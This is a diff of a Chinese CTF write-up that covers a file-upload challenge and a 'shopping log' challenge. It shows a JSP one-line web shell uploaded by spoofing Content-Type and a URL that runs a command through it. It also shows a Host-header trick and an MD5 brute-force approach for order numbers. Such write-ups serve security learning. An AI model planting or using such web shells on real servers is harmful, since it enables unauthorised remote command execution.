@@ -387,6 +387,7 @@ print flag.upper()
     <img src="https://delcoding.github.io/images/posts/redhat/17.png" height="60%" />  
 </div>
 &emsp;&emsp;而且服务器只检查了`Content-Type: image/jpeg`，其他都没有过滤。所以找个`jsp一句话`。
+
 ```java
 <%
     // pwd是密码
@@ -403,27 +404,36 @@ print flag.upper()
     }
 %>
 ```
+
 &emsp;&emsp;上传后如下访问即可：
+
 ```
 http://a65af4fd5dd746c5a742b7c50ed19b4d3fa1fff3ba564ccd.game.ichunqiu.com/03e66dd9-edae-4db6-b504-5a1be6114385/shell.jsp?pwd=xxx&cmd=ls%20../
 ```
+
 &emsp;&emsp;最终flag：`flag{5450ef7a-4e88-444d-afdd-7e3ebeca1c85}`。
 
 ### shopping log
+
 ```
 http://123.59.141.153/
 或者 http://120.132.95.234/
 hint: 不需要注入
 hint2：订单号从0000开始试可能不是一个明智的选择
 ```
+
 &emsp;&emsp;打开后在源代码中发现如下注释：
+
 ```
 <!-- Site is tmvb.com -->
 ```
+
 &emsp;&emsp;这道题尝试了挺久，用过`Site: tmvb.com`的请求头还有`X-Forwarded-For`、`X-Forwarded-Host`，但都没用，然后只能去看看`http请求头`的字段说明了，然后可以找到一个：
+
 ```
 Host    指定请求的服务器的域名和端口号 Host: www.zcmhi.com
 ```
+
 &emsp;&emsp;然后使用`Host: tmvb.com`就过了。
 <div align="center">
     <img src="https://delcoding.github.io/images/posts/redhat/18.png" height="50%" />  
@@ -441,6 +451,7 @@ Host    指定请求的服务器的域名和端口号 Host: www.zcmhi.com
     <img src="https://delcoding.github.io/images/posts/redhat/21.png" height="60%" />  
 </div>
 &emsp;&emsp;手工试了`1~10`但都没发现，然后想到`hint`里的`从0000开始试可能不是一个明智的选择`，所以考虑从`9999`往前。这里又手工了一会，发现没办法，只能写脚本跑了。脚本如下：
+
 ```python
 # -*-coding:utf-8 -*-
 
@@ -508,6 +519,7 @@ for o in range(1,9999):
         print(order)
         break
 ```
+
 &emsp;&emsp;这里参考了彩虹表的思想，先将一堆md5保存下来，要用的时候就直接找了，就不用现爆了。这里也考虑`空间换时间`的策略，首先生成了从`1000~9999999`的`md5`，因为单个碰撞也是用的这个范围，但从实际情况看范围再小点也是可以的，因为程序运行的时候数据是放在内存的，所以要考虑实际的内存大小，上面脚本在我本机上需要`1G`左右的内存。
 
 &emsp;&emsp;这里如果采用来一个爆破一个的话效率就太低了，而且每次计算的`md5`都是一样的，这就造成了资源的浪费，但就算上面这个脚本爆破的时间也是挺长的。
